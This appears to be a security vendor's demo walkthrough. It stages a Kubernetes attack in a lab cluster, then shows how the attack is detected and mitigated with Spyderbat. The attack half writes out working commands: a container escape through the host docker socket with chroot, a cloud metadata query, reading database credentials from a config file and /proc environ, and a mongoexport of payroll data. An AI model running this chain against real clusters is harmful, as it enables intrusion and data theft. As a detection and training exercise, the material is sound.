# End-To-End Cluster Attack

In this demo, we will demonstrate a complete attack with privilege escalation and data exfiltration, starting with a compromised set of developer credentials.

## Pre-Requisites

This scenario utilizes Falco containers, so you need to have the Falco integration included in this cluster. You can check if it is installed with this command:

```sh
kubectl get pods -n falco
```

If it is not present, re-run the `install.sh` script and enable the Falco integration.

## Background

The story starts with a phishing attack against our fictional developer, "Bob". Through an unfortunate series of events, the malicious actor is able to obtain Bob's `kubectl` configuration. Luckily, the configuration only allows Bob limited access to the cluster, specifically into the `build` namespace.

## Running the Exploit

### Initial Access

To begin, let's investigate the resources we have access to:

```sh
kubectl get pods -n build
```
```
NAME     READY   STATUS    RESTARTS   AGE
bobdev   1/1     Running   0          3d
```

Looks like there is just one pod, although given the name it must be manually created. Let's `exec` into it:

```sh
kubectl exec -it -n build bobdev -- /bin/bash
```

Looking through the history, it appears that this pod has access to the cluster through `kubectl`:

```sh
history
```
```
    1  ls
    2  kubectl config view
    3  kubectl get pods -A
    4  kubectl get pods -n falco
    5  kubectl describe pods -n falco
    6  kubectl exec falco-falcosidekick-6f7996c855-vrmrt -- hostname
    7  history
```

Let's take a look:

```sh
kubectl get pods
```
```
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:build:build-sa" cannot list resource "pods" in API group "" in the namespace "build"
```

Seems like we don't have much access; maybe just the `falco` namespace is available?

```sh
kubectl get pods -n falco
```
```
NAME                                   READY   STATUS    RESTARTS        AGE
falco-falcosidekick-6f7996c855-45lfm   1/1     Running   0               7h17m
falco-falcosidekick-6f7996c855-vrmrt   1/1     Running   0               7h17m
falco-mbk2n                            2/2     Running   0               7h17m
```

That was it. Next, let's check to see what security restrictions these pods have; we might be able to get more credentials than we have here:

```sh
kubectl get pods -n falco -o=jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[].securityContext}{"\n"}{end}'
```
```
falco-falcosidekick-6f7996c855-45lfm	
falco-falcosidekick-6f7996c855-vrmrt	
falco-mbk2n	{"privileged":true}
```

The `falco-mbk2n` container is privileged; that means there are a number of ways we could perform a container escape and increase our privileges.

### Privilege Escalation

Let's get into the Falco pod and take a look around.

```sh
# replace the pod name with the Falco pod name given by the previous command
kubectl exec -it -n falco falco-mbk2n -- /bin/bash
```

One method for container escape uses the host's docker socket to start a new vulnerable container. Let's check if there is a Docker socket available:

```sh
find / -name docker.sock 2>/dev/null
```
```
/host/var/run/docker.sock
```

Interesting. This means we can start a container that can perform a chroot, although we have to install docker first:

```sh
curl -fsSL https://get.docker.com | sh -
```
```sh
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/host ubuntu chroot /host/ bash
```

Now, we are running in a chroot on the host machine. You can validate this by checking for a `.dockerenv` file:

```sh
stat /.dockerenv
```
```
stat: cannot statx '/.dockerenv': No such file or directory
```

### Exploitation

Now that we are out of the pod, we should be able to query the AWS IMDS, or any other cloud metadata service (depending on where the cluster is hosted):

```sh
# taken from the AWS IMDS examples
TOKEN=`curl -X PUT "http://192.0.2.0/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://192.0.2.0/
```

We can also query docker for available pods:

```sh
docker ps
```

This produces quite a few containers, but there are some that look more interesting:

```
CONTAINER ID   IMAGE                                              COMMAND                  CREATED             STATUS             PORTS     NAMES
117de97154d7   mongo                                              "docker-entrypoint.s…"   17 hours ago        Up 17 hours                  k8s_payrolldb_payrolldb-6b864cb577-r9hrm_payroll-prod_dcaa3d77-c698-41cf-9f81-91804e6edab4_0
2668fa5e565d   public.ecr.aws/a6j2k0g1/payroll-calculator         "/bin/sh -c 'python …"   18 hours ago        Up 18 hours                  k8s_payroll-calculator_payroll-calculator-684c6b68cf-ndx9z_payroll-prod_5c5953d1-caaf-4cc6-b97f-83191cd82ebb_0
```

Let's exec into the `payroll-calculator` container and see if we can get some information from the app in there:

```sh
# Replace the container name with one of the payroll-calculator names listed in the previous command.
# make sure it does not start with k8s_POD
docker exec -it k8s_payroll-calculator_payroll-calculator-684c6b68cf-ndx9z_payroll-prod_5c5953d1-caaf-4cc6-b97f-83191cd82ebb_0 bash
```

Looking around, we see the source code and a configuration file:

```sh
ls -la
```
```
total 20
drwxr-xr-x 1 root root 4096 Oct 18  2023 .
drwxr-xr-x 1 root root 4096 Oct 18  2023 ..
-rw-rw-r-- 1 root root   79 Oct 18  2023 payroll-calc.conf
-rw-rw-r-- 1 root root 3625 Oct 18  2023 payroll-calc.py
-rwxrwxr-x 1 root root   31 Oct 18  2023 requirements.txt
```

Let's take a look at the configuration file:

```sh
cat payroll-calc.conf
```
```
MONGODB_HOST=payrolldb
MONGODB_USER=payroll-calc
MONGODB_PASSWD=secure-password
```

Looks like there is a Mongo database that this pod can connect to. Looking into the source code, it looks like the host is set through environment variables, and that the database has a `payrolldata` collection:

```sh
cat payroll-calc.py
```
```py
# ...
MONGODB_HOST = os.environ.get("MONGODB_HOST", "localhost")
client = MongoClient(MONGODB_HOST, 27017)
db = client.payrolldata
# ...
```

We can check the environment variables of the process to figure out which host to query:

```sh
ps -aux
```
```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2576   892 ?        Ss   12:06   0:00 /bin/sh -c python payroll-calc.py
root           7  0.0  0.4 260216 35208 ?        Sl   12:06   0:04 python payroll-calc.py
root          12  0.1  0.4 334056 35488 ?        Sl   12:08   0:15 /usr/local/bin/python /usr/src/app/payroll-calc.py
root          21  0.0  0.0   4608  3636 pts/0    Ss   14:46   0:00 bash
root          31  0.0  0.0   8528  4168 pts/0    R+   14:54   0:00 ps -aux
```
```sh
# replace '12' with the PID listed by the previous command for one of the Python processes
cat /proc/12/environ | tr '\0' '\n' | grep MONGODB_HOST
```
```
MONGODB_HOST=payrolldb
```

Now, we can use a Mongo command line tool to get the data we need:

```sh
mongoexport "mongodb://payroll-calc:secure-password@payrolldb:27017/" -c payrolldata # trufflehog:ignore
```
```
2024-08-14T14:58:54.552+0000	connected to: mongodb://[**REDACTED**]@payrolldb:27017
{"_id":{"$oid":"66bbcccfaa117cc5c1149f48"},"item":"Bob","qty":2500,"tags":["hourly"],"date":"Tue Jul 04 02:16:28 PM CDT 2024"}
{"_id":{"$oid":"66bbcccfaa117cc5c1149f49"},"item":"Joe","qty":4500,"tags":["salary"],"date":"Tue Jul 05 02:17:48 PM CDT 2024"}
{"_id":{"$oid":"66bbcccfaa117cc5c1149f4a"},"item":"Sally","qty":4000,"tags":["salary"],"date":"Tue Jul 05 02:26:36 PM CDT 2024"}
2024-08-14T14:58:54.558+0000	exported 3 records
```

### Summary

To review: as the "attacker", we started with only access to the `bobdev` pod in the `build` namespace. From there, we were able to use the pod's service account to access a privileged Falco pod, and then perform a container escape using the host docker socket. On the host, we had access to the cloud IMDS and other docker pods. Finally, we discovered a production payroll database and extracted the data within.

## Investigation

Now that we have completed the attack, let's look at what the Spyderbat trace looks like. From the Spyderbat Console's Dashboard page, navigate to the Security tab. In the "Recent Spydertraces with Score > 50" card, we can see that there were several Spydertraces caused by our activity. These may be labeled `container_escape_using_chroot`, `root_shell`, `docker_command_inside_container_detection`, `container_shell`, or `interactive_child_bash`, depending on the root flag that caused the trace.

In a real environment, we would likely investigate these one at a time and eventually discover that they are all linked by checking the commands that are run. In this case, however, we know they are all from the same activity, so we can select several of the traces and start a process investigation. To make sure we get everything, expand the groups and select Spydertraces with one in each namespace: build, Falco, no namespace, and payroll-prod. You may need to scroll to the side to see the namespace column.

![An example of the initial graph](./initial_graph.png)

As shown in the example above, the initial graph has quite a bit of information present. To make better sense of it, let's clean up the graph a bit. To start, take a look at the largest tree:

![The largest process tree, located within the Falco pod](./large_tree.png)

This shows bash running `curl`, `sh`, and many other child processes beneath `sh`. In those children, we can see `dpkg` and `apt-get`; both are package installers. With that information, we can assume that this tree represents the docker install script we ran. Since we already know what this tree is, let's minimize it. Right-click the `sh` process and select "Remove X Descendants".

This is much more manageable now, but there are still some processes missing since they were not included in the traces. To make sure we are not missing anything, right-click the root processes of each container (the first colored process within the container "box") and select "Add X Children" or "Add X Descendant Connections". If the graph gets too large again, just right-click the point you want to prune and remove what isn't needed. Another tip is to remove the IP down at the bottom with port 53. This is the DNS service and doesn't seem to be relevant here. The final step is to right-click on the top-level shim processes and move them left or right to reorder the graph to make it more readable. To make this step easier, try enabling "Show Relative Time" in the options at the top of the graph (I have it enabled in the screenshots above).

![An example of a cleaner graph, showing just the root actions taken by the attacker](./clean_graph.png)

Now with this clean graph, we can use the details view (after selecting each process) to clearly see the sequence of events. In the `bobdev` container, the attacker connected, ran some exploratory kubectl commands, and then exec-ed into the Falco pod:

![The graph within the bobdev container, showing the kubectl exec into the falco namespace](./bobdev_subgraph.png)

In the Falco pod, the attacker located the vulnerable docker socket, downloaded and installed Docker, and then ran an Ubuntu image with host mounts to gain `chroot` access to the host machine:

![The Falco subgraph, showing the docker container escape command](./falco_subgraph.png)

In the chroot environment, the attacker checked if they had escaped the container, tried to access the AWS metadata service, and then located and jumped into one of the payroll calculator pods:

![The chroot container escape environment, showing the docker exec into the payroll environment](./chroot_subgraph.png)

Lastly, the attacker investigated the payroll calculator application, located vulnerable database credentials, and exfiltrated the database contents.

![The payroll container subgraph, showing the Mongo export command](./payroll_subgraph.png)

## Next steps

Now that we have determined the scope of the attack and several vulnerabilities that made it possible, we can take steps to mitigate this in the future. For example:

- Terminate the attacker's connection to the cluster
- Rotate Bob's developer credentials
- Remove the `bobdev` pod, or restrict its access from the sensitive `falco` environment
- [Set up a Spyderbat cluster policy](https://docs.spyderbat.com/tutorials/guardian/how-to-put-guardrails-around-your-k8s-cluster-spyctl) to prevent anomalous pods and images from being run in the cluster
- [Set up a Spyderbat workload policy](https://docs.spyderbat.com/tutorials/guardian/how-to-lock-down-your-critical-workloads-with-policies-spyctl) to prevent anomalous processes and connections within your existing pods
- Use safer secret storage methods for accessing the Mongo database

## Further Reading

- [Guardian and Interceptor Policies - Spyderbat Documentation](https://docs.spyderbat.com/concepts/guardian)
- [How to Lock Down Your Workloads With Guardian Policies Using Spyctl - Spyderbat Documentation](https://docs.spyderbat.com/tutorials/guardian/how-to-lock-down-your-critical-workloads-with-policies-spyctl)

